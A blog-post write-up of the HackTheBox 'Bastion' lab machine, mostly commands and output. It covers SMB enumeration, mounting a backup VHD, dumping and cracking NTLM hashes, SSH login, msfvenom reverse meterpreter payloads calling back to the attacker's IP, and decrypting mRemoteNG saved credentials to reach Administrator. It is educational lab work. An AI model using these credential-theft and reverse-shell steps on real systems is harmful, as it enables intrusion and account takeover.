---
layout: post
title: "HackTheBox: Bastion Writeup"
---

This is a writeup for the "Bastion" box on HackTheBox that retired a little while ago. This was my first time targeting a Windows machine, so while I spent a while figuring out what to do, it learned a lot in the process!

First, I wanted to find out what ports were open, what services were running, versions of those services etc. For this I used nmap:
```
sudo nmap -sS -Pn -p1-65535 -T4 -sV 10.10.10.134
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-18 10:06 BST
Nmap scan report for 10.10.10.134
Host is up (0.029s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.29 seconds
```

There's a couple of interesting services running there, but the one that really caught my eye was 445/tcp. This indicates that the target is probably exposing SMB shares. Nmap has a bunch of handy enumeration scripts for SMB, so I ran another scan to find out what shares were exposed.

```
sudo nmap 10.10.10.134 --script=smb-enum-shares
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-18 10:15 BST
Nmap scan report for 10.10.10.134
Host is up (0.029s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.134\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.134\Backups: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.10.134\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.134\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 30.04 seconds
```

So now we know our target has a backups directory shared with unauthenticated read access. I mounted the remote share to start poking around some more: `sudo mount -t cifs \\\\10.10.10.134\\Backups ~/htb/mount`.

```
ls -alh
total 9.0K
drwxr-xr-x 2 root root 4.0K Jul 18 10:25 .
drwxr-xr-x 5 dan  dan  4.0K Jul 18 09:38 ..
drwxr-xr-x 2 root root    0 Jul 18 10:16 bgwniuMXdF
drwxr-xr-x 2 root root    0 Jul 18 10:14 FlTtUwpmPJ
drwxr-xr-x 2 root root    0 Jul 18 10:16 knfyOdWGtX
drwxr-xr-x 2 root root    0 Jul 18 10:20 LpXYPinIBm
drwxr-xr-x 2 root root    0 Jul 18 09:56 NBbzotTyLr
drwxr-xr-x 2 root root    0 Jul 18 10:12 UGpvYtzuSh
drwxr-xr-x 2 root root    0 Feb 22 12:44 WindowsImageBackup
drwxr-xr-x 2 root root    0 Jul 18 10:15 ZIoVsMpSxU
-rwxr-xr-x 1 root root  260 Jul 18 09:41 nmap-test-file
-r-xr-xr-x 1 root root  116 Apr 16 11:10 note.txt
-rwxr-xr-x 1 root root    0 Feb 22 12:43 SDT65CB.tmp

ls -alh WindowsImageBackup
total 4.0K
drwxr-xr-x 2 root root    0 Feb 22 12:44 .
drwxr-xr-x 2 root root 4.0K Jul 18 10:25 ..
drwxr-xr-x 2 root root    0 Feb 22 12:45 L4mpje-PC

ls -alh WindowsImageBackup/L4mpje-PC
total 4.0K
drwxr-xr-x 2 root root  0 Feb 22 12:45  .
drwxr-xr-x 2 root root  0 Feb 22 12:44  ..
drwxr-xr-x 2 root root  0 Feb 22 12:45 'Backup 2019-02-22 124351'
drwxr-xr-x 2 root root  0 Feb 22 12:45  Catalog
drwxr-xr-x 2 root root  0 Feb 22 12:45  SPPMetadataCache
-rwxr-xr-x 1 root root 16 Feb 22 12:44  MediaId

ls -alh WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351
total 5.2G
drwxr-xr-x 2 root root 8.0K Feb 22 12:45 .
drwxr-xr-x 2 root root 4.0K Feb 22 12:45 ..
-rwxr-xr-x 1 root root  69M Jul 18 09:53 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root 5.1G Jul 18 10:06 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
-rwxr-xr-x 1 root root 1.2K Feb 22 12:45 BackupSpecs.xml
-rwxr-xr-x 1 root root 1.1K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
-rwxr-xr-x 1 root root 8.8K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
-rwxr-xr-x 1 root root 6.4K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
-rwxr-xr-x 1 root root 2.9K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
-rwxr-xr-x 1 root root 1.5K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
-rwxr-xr-x 1 root root 1.5K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
-rwxr-xr-x 1 root root 3.8K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
-rwxr-xr-x 1 root root 3.9K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
-rwxr-xr-x 1 root root 7.0K Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
-rwxr-xr-x 1 root root 2.3M Feb 22 12:45 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
```

So from this SMB share, we've managed to find some VHD files, which based on the folder name I'm assuming were made by the built-in Windows backup tool (https://support.microsoft.com/en-gb/help/17127/windows-back-up-restore).

Rather than download a 5.1Gbyte file, I looked into options for mounting it remotely from the SMB share. I found a program called libguestfs-tools (http://libguestfs.org/), which does plenty more besides just mounting VHD images. I mounted the larger of the two VHD images by running `sudo guestmount --add ~/htb/mount/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro ~/htb/img`. This performed auto-discovery of partitions on the drive and after a short wait, I was presented with a mounted Windows drive.

From here, I started poking around looking for files that might be useful, but didn't find anything interesting. Then I remembered from my earlier enumeration that there was an SSH server running on the target. Perhaps we could try and extract some password hashes from this backup and try to login with them?

Given that I'm working with an offline source, I used the creddump tool (https://github.com/moyix/creddump) to extract the local user accounts and password hashes from the registry. This requires two files: the System Hive and the SAM (Security Accounts Manager) hive. These can be found in Windows/System32/Config.

```
pwdump SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

The format of the output above is: `Username:Security Identifier:LanMan hash:NT LanMan hash:::`

LanMan hashes are horribly insecure: there is no salt used, passwords aren't case sensitive and are limited to a 95 character subset of ASCII, length limited to 14 characters and the password is split into two 7 character pieces and used as part of a DES key generation algorithm. Because the password is split into two 7 character pieces, the keyspace for these passwords isn't the expected 95^14 (4876749791155298590087890625) but instead 2*95^7 (139667459218750).

Regardless of the weakness of LanMan password storage, these LanMan hashes are all for an empty password (https://security.stackexchange.com/questions/61168/identical-lanman-hashes-on-ad-accounts). Therefore, I needed to crack the NTLanMan hashes, which are also very insecure. The NTLanMan storage format is Unsalted MD4(UTF16-LE(Password)). I decided to start with a dictionary attack using the RockYou dictionary (https://github.com/danielmiessler/SecLists) using HashCat to leverage my GPU for faster cracking. What I didn't expect was how fast the hash would fall.

```
hashcat -m 1000 -w 2 -O -o cracked-hashes.txt hashes.txt ~/SecLists/Passwords/Leaked-Databases/rockyou.tx
t
hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1050 Ti, 1009/4036 MB allocatable, 6MCU

Hashes: 3 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Watchdog: Temperature abort trigger set to 90c

Dictionary cache built:
* Filename..: /home/dan/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: hashes.txt
Time.Started.....: Thu Jul 18 11:41:54 2019 (1 sec)
Time.Estimated...: Thu Jul 18 11:41:55 2019 (0 secs)
Guess.Base.......: File (/home/dan/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17576.7 kH/s (5.73ms) @ Accel:512 Loops:1 Thr:1024 Vec:1
Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 9441705/14344384 (65.82%)
Rejected.........: 4521/9441705 (0.05%)
Restore.Point....: 6294395/14344384 (43.88%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: lebfob -> brrkkiki
Hardware.Mon.#1..: Temp: 33c Fan: 30% Util: 40% Core:1430MHz Mem:3504MHz Bus:16

Started: Thu Jul 18 11:41:49 2019
Stopped: Thu Jul 18 11:41:55 2019

less cracked-hashes.txt
31d6cfe0d16ae931b73c59d7e0c089c0:
26112010952d963c8dc4217daec986d9:bureaulampje
```

The empty result for the hash shared by Administrator and Guest suggests to me that these accounts were disabled on the machine this backup was taken from. But we got a hit for the L4mpje account in 6 seconds. I confirmed my earlier hunch and was able to successfully log into the target using L4mpje:bureaulampje over SSH!

With all HackTheBox targets, the user flag is stored in a file called user.txt on the Desktop on Windows and in the user's home directory on *nix targets.

```
l4mpje@BASTION C:\Users\L4mpje>type Desktop\user.txt                                                               
9bfe57d5c3309db3a151772f9d86c6cd
```

So at this point I had an initial foothold and needed to figure out some way of elevanting my privileges. To make post-exploitation easier, I decided to establish a reverse meterpreter shell.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.13.9 LPORT=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
```

I then setup my listener to catch the incoming connection

```
msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.13.9
LHOST => 10.10.13.9
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.13.9:4444 
```

I copied my shell to the target using SCP and tried to execute it.

```
l4mpje@BASTION C:\Windows\Tasks>dir                                                                                
 Volume in drive C has no label.                                                                                   
 Volume Serial Number is 0CB3-C487                                                                                 
                                                                                                                   
 Directory of C:\Windows\Tasks                                                                                     
                                                                                                                   
18-07-2019  13:09    <DIR>          .                                                                              
18-07-2019  13:09    <DIR>          ..                                                                             
18-07-2019  13:09            73.802 shell.exe                                                                      
               1 File(s)         73.802 bytes                                                                      
               2 Dir(s)   5.937.876.992 bytes free                                                                 
                                                                                                                   
l4mpje@BASTION C:\Windows\Tasks>shell.exe                                                                          
The system cannot execute the specified program.
```

Ah. I guess AppLocker doesn't want us executing a random reverse shell, so we're going to have to get creative. I decided to try using Powershell as a way of bypassing AppLocker.

```
msfvenom --payload windows/x64/meterpreter_reverse_tcp LHOST=10.10.13.9 LPORT=4444 --format psh > shell.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 206403 bytes
Final size of psh file: 964185 bytes
```

```
l4mpje@BASTION C:\Users\L4mpje>powershell.exe -ExecutionPolicy Bypass -File shell.ps1                              
Operation did not complete successfully because the file contains a virus or potentially unwanted software.        
    + CategoryInfo          : ObjectNotFound: (:String) [], ParentContainsErrorRecordException                     
    + FullyQualifiedErrorId : CommandNotFoundException   
```

I spent far too long trying to get a meterpreter shell running on this box before I decided to try a different tactic. I did some enumeration for things that looked out of place on the box and found a copy of mRemoteNG installed. This program allows a user to connect to remote machines over a number of different protocols such as SSH, RDP etc. I went looking for a file containing saved connections and found it in `C:\Users\L4mpje\AppData\Remote\mRemoteNG\confCons.xml`.

The version of mRemoteNG that was installed on Bastion encrypts passwords using AES128-GCM, but can use a default password that is then stretched to form the AES key. Googling for 'mremoteng password decrypt' will give you a ruby script from quite a long time ago (when AES128-CBC was used) which will not work, and a number of similar python scripts. I used the one at https://github.com/kmahyyg/mremoteng-decrypt. Initially I was pointing it at the confCons.xml file I looted from Bastion, but was always getting a MAC check failed error, even when I tried a couple of different easy to guess passwords. Then I tried extracting the password ciphertext for the connection I was interested and ran:

```
python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

With the Administrator password in hand, all I had to do now was connect to SSH again, but this time as the Administrator user:

```
Microsoft Windows [Version 10.0.14393]                                                                             
(c) 2016 Microsoft Corporation. All rights reserved.                                                               

administrator@BASTION C:\Users\Administrator>whoami                                                                
bastion\administrator                                                                                              

administrator@BASTION C:\Users\Administrator>dir                                                                   
 Volume in drive C has no label.                                                                                   
 Volume Serial Number is 0CB3-C487                                                                                 

 Directory of C:\Users\Administrator                                                                               

25-04-2019  06:08    <DIR>          .                                                                              
25-04-2019  06:08    <DIR>          ..                                                                             
23-02-2019  10:40    <DIR>          Contacts                                                                       
23-02-2019  10:40    <DIR>          Desktop                                                                        
23-02-2019  10:40    <DIR>          Documents                                                                      
23-02-2019  10:40    <DIR>          Downloads                                                                      
23-02-2019  10:40    <DIR>          Favorites                                                                      
23-02-2019  10:40    <DIR>          Links                                                                          
23-02-2019  10:40    <DIR>          Music                                                                          
23-02-2019  10:40    <DIR>          Pictures                                                                       
23-02-2019  10:40    <DIR>          Saved Games                                                                    
23-02-2019  10:40    <DIR>          Searches                                                                       
23-02-2019  10:40    <DIR>          Videos                                                                         
               0 File(s)              0 bytes                                                                      
              13 Dir(s)  11.403.587.584 bytes free                                                                 

administrator@BASTION C:\Users\Administrator>cd Desktop                                                            

administrator@BASTION C:\Users\Administrator\Desktop>dir                                                           
 Volume in drive C has no label.                                                                                   
 Volume Serial Number is 0CB3-C487                                                                                 

 Directory of C:\Users\Administrator\Desktop                                                                       

23-02-2019  10:40    <DIR>          .                                                                              
23-02-2019  10:40    <DIR>          ..                                                                             
23-02-2019  10:07                32 root.txt                                                                       
               1 File(s)             32 bytes                                                                      
               2 Dir(s)  11.403.587.584 bytes free                                                                 

administrator@BASTION C:\Users\Administrator\Desktop>type root.txt                                                 958850b91811676ed6620a9c430e65c8 
```

This box taught me a couple of things. Firstly, I learned a lot about enumerating SMB and working with VHD files. I also leanred how difficult Applocker can make life for an attacker and how insecure the LanMan and NTLanMan password hashing schemes are.
